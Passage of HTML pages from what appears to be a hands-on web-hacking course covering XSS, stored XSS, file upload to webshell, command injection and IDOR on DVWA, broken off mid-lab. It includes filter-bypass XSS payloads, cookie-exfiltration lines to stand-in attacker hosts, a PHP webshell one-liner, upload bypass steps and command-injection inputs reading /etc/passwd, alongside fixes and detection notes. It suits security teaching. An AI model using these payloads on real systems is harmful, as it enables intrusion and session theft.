+#  'a login form / any DB-backed input'           -> SQL injection (' OR 1=1 --)
+#  'an upload field accepts files'                -> file upload (try .php)</code></pre><p style="margin-top:8px"><b>You should see:</b> the symptom points straight at the family and its first test payload. This map is your triage for any web target &mdash; and the running order of the session.</p></div><div class="box key-takeaway"><span class="box-t">Five families, one theme</span><p><strong class="hl">Wherever the app trusts input, there is an attack.</strong> Browser (XSS), server (upload, cmd-injection), access control (IDOR), database (SQLi). Learn the five and you can test any web app methodically.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="XSS">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P08</span><span class="tag theory">Attack &middot; cross-site scripting</span><span class="time">&#9201; 7 min</span></div>
+      <h1>XSS &mdash; Your JavaScript in Their Browser</h1>
+      <p class="lede">The app hands your input to another user&#39;s browser as code. Learn the three flavours and the one that scales to every visitor.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Injection at the client tier</span><p><strong>Cross-Site Scripting</strong> is injection into the browser: the app puts your input into a page without encoding it, so the browser runs it as JavaScript &mdash; in the victim&#39;s session, with their cookies. The impact ranges from a harmless <span class="mono">alert(1)</span> proof to full account takeover via cookie theft. The three types differ in <em>where the payload lives</em>. Click each.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 190" role="img" aria-label="The three types of XSS: reflected, stored, and DOM-based. Click each.">
+          <g class="node" data-node="ref" tabindex="0"><rect x="30" y="45" width="270" height="110" rx="12" fill="#1a1f2a" stroke="#fbbf24"/><text class="d-title" x="165" y="80" text-anchor="middle" font-size="14" fill="#fbbf24">REFLECTED</text><text class="d-sub" x="165" y="104" text-anchor="middle">payload in the request,</text><text class="d-sub" x="165" y="122" text-anchor="middle">echoed in the response</text><text class="d-sub" x="165" y="142" text-anchor="middle">needs the victim to click a link</text></g>
+          <g class="node" data-node="sto" tabindex="0"><rect x="335" y="45" width="270" height="110" rx="12" fill="#241417" stroke="#ff7043"/><text class="d-title" x="470" y="80" text-anchor="middle" font-size="14" fill="#ff7043">STORED</text><text class="d-sub" x="470" y="104" text-anchor="middle">payload saved in the DB,</text><text class="d-sub" x="470" y="122" text-anchor="middle">runs for EVERY visitor</text><text class="d-sub" x="470" y="142" text-anchor="middle">highest severity &mdash; no click needed</text></g>
+          <g class="node" data-node="dom" tabindex="0"><rect x="640" y="45" width="270" height="110" rx="12" fill="#1f2533" stroke="#22d3ee"/><text class="d-title" x="775" y="80" text-anchor="middle" font-size="14" fill="#22d3ee">DOM-BASED</text><text class="d-sub" x="775" y="104" text-anchor="middle">client-side JS writes your</text><text class="d-sub" x="775" y="122" text-anchor="middle">input into the DOM unsafely</text><text class="d-sub" x="775" y="142" text-anchor="middle">never touches the server</text></g>
+        </svg>
+        <div class="dgm-hint">Click each type &mdash; where the payload lives, and how it reaches a victim.</div>
+        <div class="dgm-detail" data-detail="ref"><h5><span class="dd-tag">REFLECTED</span>Bounced straight back</h5><p><b>Your payload is in the request (a search term, a URL parameter) and the server echoes it into the response unencoded.</b> It only fires for someone who follows your crafted link &mdash; so exploitation means <em>delivering</em> the link (phishing). Medium severity, very common. Test: put <span class="mono">&lt;script&gt;alert(1)&lt;/script&gt;</span> in a parameter and see if it executes.</p></div>
+        <div class="dgm-detail" data-detail="sto"><h5><span class="dd-tag">STORED</span>The dangerous one</h5><p><b>Your payload is saved by the app (a comment, a profile field, a message) and served to <em>every</em> visitor who loads that page.</b> No link to send, no click to engineer &mdash; it fires automatically for everyone, including admins. Highest severity. This is the flow you will watch on the next page and exploit in Lab A.</p></div>
+        <div class="dgm-detail" data-detail="dom"><h5><span class="dd-tag">DOM-BASED</span>All in the browser</h5><p><b>The vulnerability is entirely in client-side JavaScript</b> &mdash; e.g. code that reads <span class="mono">location.hash</span> and writes it into the page with <span class="mono">innerHTML</span>. The malicious data may never reach the server, so server-side filters and logs miss it. Found by reading the JS, not the responses.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; prove reflected XSS in one field</span><pre><code># On DVWA (XSS Reflected, Low) put this in the input and submit:
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+# if a popup shows the domain, the app ran YOUR script in the page.
+# escalate the proof (do NOT do this off your lab):
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;   # shows the session cookie is reachable</code></pre><p style="margin-top:8px"><b>You should see:</b> the alert proves the browser executed input the app should have encoded. <span class="mono">document.cookie</span> being reachable is the leap from &quot;popup&quot; to &quot;session theft&quot; &mdash; which is why XSS is high-impact, not a toy.</p></div><div class="box key-takeaway"><span class="box-t">Encode on output</span><p><strong class="hl">XSS is unencoded output.</strong> Stored is worst (fires for everyone), reflected needs a click, DOM lives in the JS. The fix is always the same &mdash; encode user data when writing it into a page &mdash; which is the defence you will map later.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Stored XSS &amp; bypass">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P09</span><span class="tag attack">Attack &middot; the scaling flow</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Stored XSS &mdash; One Payload, Every Visitor</h1>
+      <p class="lede">Watch a stored payload plant itself once and fire for everyone who loads the page &mdash; then how attackers slip past naive filters.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why stored XSS scales</span><p>Reflected XSS needs you to deliver a link to each victim. <strong>Stored XSS</strong> is planted once &mdash; in a comment, a name, a support ticket &mdash; and the app serves it to <em>every</em> visitor, admins included, with no action on their part. Watch the flow, then see why a blocklist of <span class="mono">&lt;script&gt;</span> does not save you.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="Stored XSS: the attacker posts a payload once, the app saves it in the database, and it executes in the browser of every user who later views the page.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">posts once</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">WEB APP + DB</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">stores it</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">EVERY VICTIM</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">loads the page</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="352" y="106" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">post a comment containing &lt;script&gt;...&lt;/script&gt;</text>
+          <path d="M191,120 L514,120" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <rect x="245" y="152" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--orange)"/>
+          <text x="470" y="172" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--orange)">app saves the payload in the database, unencoded</text>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">victim opens the page (normal browsing)</text>
+          <path d="M884,228 L526,228" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <rect x="245" y="260" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="280" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">the stored &lt;script&gt; runs in the victim&#39;s browser</text>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <text x="537" y="322" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">cookie / session exfiltrated to the attacker</text>
+          <path d="M884,336 L191,336" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The attacker submits the payload once, through a normal feature (a comment, a profile bio).</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>The flaw: it stores the raw input and will later render it as part of the page for anyone.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>No link to click, no trick &mdash; the victim just views the page that now contains the payload.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>It executes with the victim's session. document.cookie, keylogging, a silent request as them.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>location='//evil/?c='+document.cookie sends the session to the attacker &mdash; account takeover, for every visitor.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; beat a naive &lt;script&gt; filter</span><pre><code># If the app strips the literal string 'script', these still fire — no &lt;script&gt; needed:
+&lt;img src=x onerror=alert(document.domain)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+# case/encoding tricks:  &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;   %3Cscript%3E...</code></pre><p style="margin-top:8px"><b>You should see:</b> blocklisting one tag or word is not a defence &mdash; there are dozens of ways to run JS without <span class="mono">&lt;script&gt;</span>. This is exactly why the real fix is <b>output encoding</b>, not input blocklists.</p></div><div class="box key-takeaway"><span class="box-t">Stored = automatic + everyone</span><p><strong class="hl">Plant once, fire for all.</strong> Stored XSS needs no victim action and hits admins too, which is why it is the high-severity flavour. And blocklist filters lose &mdash; encode output and use a Content-Security-Policy instead.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="File upload to shell">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P10</span><span class="tag attack">Attack &middot; web bug to RCE</span><span class="time">&#9201; 7 min</span></div>
+      <h1>File Upload &mdash; The Fastest Path to a Shell</h1>
+      <p class="lede">When an app stores an executable you uploaded, you own the server. Watch a webshell go from upload field to remote code execution.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Upload code, then run it</span><p>An upload feature becomes remote code execution when two things are true: the app lets you upload a <strong>server-executable</strong> file (e.g. <span class="mono">.php</span>), and it stores it somewhere the web server will <strong>run</strong> it. Browse to the uploaded file and its code executes on the server &mdash; a shell, no memory-corruption exploit required. This is the web&#39;s shortcut to the Session 5 foothold.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="File upload to RCE: the attacker uploads a PHP webshell, the app stores it in an executable path, and browsing to it runs commands on the server.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">browser + Burp</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">WEB APP</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">upload handler</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">SERVER OS</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">runs the code</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="352" y="106" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">upload shell.php (a webshell)</text>
+          <path d="M191,120 L514,120" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <rect x="245" y="152" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--orange)"/>
+          <text x="470" y="172" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--orange)">weak check &rarr; app stores it under /uploads/</text>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="537" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">browse to /uploads/shell.php?c=id</text>
+          <path d="M191,228 L884,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="537" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">command output / reverse shell returned</text>
+          <path d="M884,282 L191,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">SOC flip: a new executable in an upload dir being requested</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>A tiny PHP file: <?php system($_GET["c"]); ?> &mdash; or a full PentestMonkey reverse shell.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>If it only checks a client-side extension or a spoofable MIME type, the .php lands in a web-served directory.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Requesting the file makes the web server EXECUTE it as PHP &mdash; your command runs on the OS.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>id, whoami, or a full reverse shell back to your listener. You now have the foothold &mdash; hand off to S5/S6.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>A POST to an upload endpoint followed by a GET to a new .php in /uploads is a strong web-log signature.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; test whether an upload filter is real</span><pre><code># Try, in order, until one is stored AND executes:
+#  1. shell.php                    (no filter?)
+#  2. shell.php.jpg / shell.pHp     (extension tricks)
+#  3. shell.php + Content-Type: image/jpeg  (spoof MIME in Burp)
+#  4. add magic bytes: 'GIF89a;' then the PHP  (content-sniff bypass)
+# then browse to it:  curl 'http://TARGET/uploads/shell.php?c=id'</code></pre><p style="margin-top:8px"><b>You should see:</b> if any variant lands in an executable path and runs, the &quot;filter&quot; was client-side or trivially spoofable. A real defence checks the true type server-side, renames the file, and stores it outside the webroot.</p></div><div class="box key-takeaway"><span class="box-t">Executable + reachable = RCE</span><p><strong class="hl">A stored, runnable upload is game over.</strong> The fix is a server-side allow-list of types, renaming, storage outside the webroot, and execution disabled in the upload dir &mdash; break any one link and the shell dies.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Command injection">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P11</span><span class="tag attack">Attack &middot; input to the OS</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Command Injection &mdash; Your Input Becomes a Shell Command</h1>
+      <p class="lede">When an app builds an OS command from your input, a semicolon runs your command too. Direct code execution, no upload needed.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Injection at the OS boundary</span><p>Some apps shell out to the operating system &mdash; a &quot;ping this host&quot; tool, an image converter, a PDF generator. If the app concatenates your input into that command, you add your own: <span class="mono">ping 8.8.8.8; cat /etc/passwd</span> runs both. Same root cause as SQLi and XSS &mdash; data treated as code &mdash; but the interpreter here is the <strong>shell</strong>, so you get direct server execution.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="Command injection: an app runs an OS command built from user input; the attacker appends a second command with a shell metacharacter.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">fills a field</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">WEB APP</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">builds a command</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">SHELL / OS</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">runs both</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--text-3)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">app intends:  ping -c1 &lt;user input&gt;</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="352" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">input: 8.8.8.8 ; id</text>
+          <path d="M191,174 L514,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">server runs:  ping -c1 8.8.8.8 ; id</text>
+          <path d="M526,228 L884,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="537" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">output of both returned &mdash; uid=33(www-data)</text>
+          <path d="M884,282 L191,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">SOC flip: web process spawning a shell child</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>A legitimate feature: enter a host, the server pings it and shows the result.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>The attacker adds a shell metacharacter (; | && `) and a second command.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>The shell sees two commands. The app never meant to run id &mdash; but it built the string from raw input.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>You see command output in the response. Upgrade to a reverse shell for an interactive foothold.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>apache/php spawning sh/bash/cat is an abnormal process tree &mdash; an EDR/auditd detection independent of the web log.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; test a field for command injection</span><pre><code># In any field that looks like it runs a system command (ping, nslookup, convert), try:
+8.8.8.8 ; id
+8.8.8.8 && whoami
+8.8.8.8 | cat /etc/passwd
+`id`      $(id)
+# blind? use a delay or a callback:
+8.8.8.8 ; sleep 5      # 5s delay = injection even with no visible output</code></pre><p style="margin-top:8px"><b>You should see:</b> if <span class="mono">id</span> output appears &mdash; or the response takes 5 seconds &mdash; your input reached the shell. The <span class="mono">sleep</span> trick proves <b>blind</b> command injection when you can&#39;t see the output, exactly like blind SQLi later.</p></div><div class="box key-takeaway"><span class="box-t">Never build commands from input</span><p><strong class="hl">A shell metacharacter turns one command into two.</strong> The fix is to avoid shelling out with user input at all &mdash; use language APIs or strictly parameterised calls, and validate input against an allow-list.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="IDOR">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P12</span><span class="tag attack">Attack &middot; broken access control</span><span class="time">&#9201; 6 min</span></div>
+      <h1>IDOR &mdash; Change the Number, See Their Data</h1>
+      <p class="lede">OWASP&#39;s #1 risk needs no payload at all. If the app trusts an id you send, you read records that are not yours.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The flaw with no exploit</span><p><strong>Insecure Direct Object Reference</strong> is the simplest attack in the session and the highest-ranked risk on the OWASP list (Broken Access Control). The app exposes a reference to an object &mdash; <span class="mono">?id=123</span>, <span class="mono">/invoice/5001.pdf</span>, a hidden <span class="mono">account</span> field &mdash; and checks that you are logged in, but <em>not</em> that the object is yours. Change the value, get someone else&#39;s data. Click each idea.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 180" role="img" aria-label="IDOR: authentication versus authorization, and where the check is missing. Click each.">
+          <g class="node" data-node="authn" tabindex="0"><rect x="40" y="50" width="250" height="80" rx="10" fill="#12241c" stroke="#4ade80"/><text class="d-title" x="165" y="82" text-anchor="middle" font-size="13" fill="#4ade80">AUTHENTICATION</text><text class="d-sub" x="165" y="104" text-anchor="middle">are you logged in? &mdash; yes</text></g>
+          <g class="node" data-node="authz" tabindex="0"><rect x="350" y="50" width="250" height="80" rx="10" fill="#241417" stroke="#e63946"/><text class="d-title" x="475" y="82" text-anchor="middle" font-size="13" fill="#e63946">AUTHORIZATION</text><text class="d-sub" x="475" y="104" text-anchor="middle">is THIS record yours? &mdash; not checked</text></g>
+          <g class="node" data-node="exp" tabindex="0"><rect x="660" y="50" width="250" height="80" rx="10" fill="#1a1f2a" stroke="#ff7043"/><text class="d-title" x="785" y="82" text-anchor="middle" font-size="13" fill="#ff7043">EXPLOIT</text><text class="d-sub" x="785" y="104" text-anchor="middle">?id=123 &rarr; ?id=124</text></g>
+          <path d="M290,90 L348,90" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"/>
+          <path d="M600,90 L658,90" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-r)"/>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; the difference that IDOR exploits.</div>
+        <div class="dgm-detail" data-detail="authn"><h5><span class="dd-tag">AUTHENTICATION</span>Who you are</h5><p><b>The app verifies you are a logged-in user &mdash; and stops there.</b> Being authenticated feels like security, but it only proves identity, not permission. Most IDOR-vulnerable apps get this part right, which is why the bug hides.</p></div>
+        <div class="dgm-detail" data-detail="authz"><h5><span class="dd-tag">AUTHORIZATION</span>What you may access</h5><p><b>The missing check: does <em>this logged-in user</em> own the record they asked for?</b> The app fetches object 124 because you asked for it, never confirming 124 belongs to you. Authorization must be enforced <em>per object, server-side</em> &mdash; that is the fix.</p></div>
+        <div class="dgm-detail" data-detail="exp"><h5><span class="dd-tag">EXPLOIT</span>Just change the value</h5><p><b>Increment/alter the reference: <span class="mono">?id=123&rarr;124</span>, <span class="mono">/invoice/5001&rarr;5002</span>, a <span class="mono">userId</span> in a JSON body.</b> No payload, no special tooling &mdash; Burp Repeater or the URL bar. Automate with Burp Intruder to harvest every record. This is why it is so common and so damaging.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; test for IDOR in one request</span><pre><code># Log in as your own user, capture a request that fetches YOUR data:
+GET /profile?id=1337 HTTP/1.1
+# in Burp Repeater, change only the id:
+GET /profile?id=1338 HTTP/1.1
+# got someone else's profile back? that's IDOR. Automate the sweep with Intruder.</code></pre><p style="margin-top:8px"><b>You should see:</b> if id 1338 returns data that is not yours, the app authenticated you but never authorised the record. One changed number is the entire exploit &mdash; which is why broken access control tops the OWASP list.</p></div><div class="box key-takeaway"><span class="box-t">Authn is not authz</span><p><strong class="hl">Logged in &ne; allowed.</strong> IDOR is a missing per-object ownership check. The fix is server-side authorization on every object access &mdash; and using unguessable references does not replace it, it only hides it.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab A: XSS">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P13</span><span class="tag lab">Hands-on &middot; everyone &middot; attack</span><span class="time">&#9201; 16 min</span></div>
+      <h1>Lab A &mdash; Reflected and Stored XSS on DVWA</h1>
+      <p class="lede">Prove both flavours on a safe target: bounce a script off a search box, then plant one that fires for every visitor.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Two XSS, one lab</span><p>You will exploit <strong>reflected</strong> XSS (fires for whoever clicks your link) and <strong>stored</strong> XSS (fires for everyone), then raise DVWA&#39;s security level to watch a naive filter and defeat it. Everything is on your own DVWA &mdash; never point these payloads at a site you do not own.</p></div>
+      <ol class="steps">
+<li>
+<b>Reflected</b> &mdash; DVWA &rarr; XSS (Reflected), Low. Put a payload in the name field:
+<pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
+# the popup proves your JS ran in the page. Now craft the delivery URL:
+http://DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The alert fires and the URL carries the payload &mdash; anyone who clicks that link runs it. That is reflected XSS and its phishing-style delivery.</li></ul></div>
+</li>
+<li>
+<b>Stored</b> &mdash; DVWA &rarr; XSS (Stored). Submit a guestbook entry containing:
+<pre><code>&lt;script&gt;alert('stored-'+document.domain)&lt;/script&gt;
+# now RELOAD the page (or open it as another user) — it fires again, with no link.</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The payload persisted and executes on every load, for every visitor &mdash; the high-severity flavour. Note you did nothing to the second &quot;victim&quot;; the page did.</li></ul></div>
+</li>
+<li>
+<b>Beat the filter</b> &mdash; raise to Medium (strips <span class="mono">&lt;script&gt;</span>) and use an event handler:
+<pre><code>&lt;img src=x onerror=alert(document.cookie)&gt;
+# or:  &lt;svg onload=alert(1)&gt;   /   &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A blocklist that removes <span class="mono">&lt;script&gt;</span> does nothing against <span class="mono">onerror</span> &mdash; proving why the real fix is output encoding + CSP, not input blocklists.</li></ul></div>
+</li>
+<li>
+<b>Weaponise the proof</b> (concept only, on your lab) &mdash; show why XSS = account takeover:
+<pre><code>&lt;script&gt;new Image().src='http://ATTACKER/c?='+document.cookie&lt;/script&gt;
+# the session cookie is sent to the attacker -> replay it -> logged in as the victim</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Cookie exfiltration turns a popup into session hijacking. This is the bridge to Session 9&#39;s session-hijacking material &mdash; XSS is one way to steal the token.</li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">You ran code in another context</span><p><strong class="hl">XSS executes your code with the victim&#39;s privileges.</strong> Reflected needs a click, stored needs nothing, and filters that blocklist tags lose. The defender&#39;s answer &mdash; encode output, set a CSP &mdash; comes later; first you had to see it fire.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab B: upload to shell">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P14</span><span class="tag lab">Hands-on &middot; everyone &middot; foothold</span><span class="time">&#9201; 16 min</span></div>
+      <h1>Lab B &mdash; Upload a Webshell, Get a Shell</h1>
+      <p class="lede">Turn an upload field into remote code execution: plant a webshell, defeat a weak filter, and land a foothold on the server.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">From web bug to server foothold</span><p>This is the web&#39;s shortcut to Session 5&#39;s foothold: no exploit, just an upload the app should not have accepted. You will upload a webshell, bypass a client-side/MIME filter, and run commands &mdash; then optionally upgrade to a reverse shell.</p></div><div class="box warn"><span class="box-t">Your own DVWA / lab only</span><p>A webshell is real code execution. Keep it on the isolated lab network and delete the uploaded shell afterward.</p></div>
+      <ol class="steps">
+<li>
+<b>Prepare a webshell</b> &mdash; a one-liner is enough to prove RCE:
+<pre><code>echo '<?php system($_GET["c"]); ?>' > shell.php
+# (or use Kali's PentestMonkey reverse shell: /usr/share/webshells/php/php-reverse-shell.php)</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A minimal PHP command-runner. If the server executes it, <span class="mono">?c=id</span> runs <span class="mono">id</span> on the OS.</li></ul></div>
+</li>
+<li>
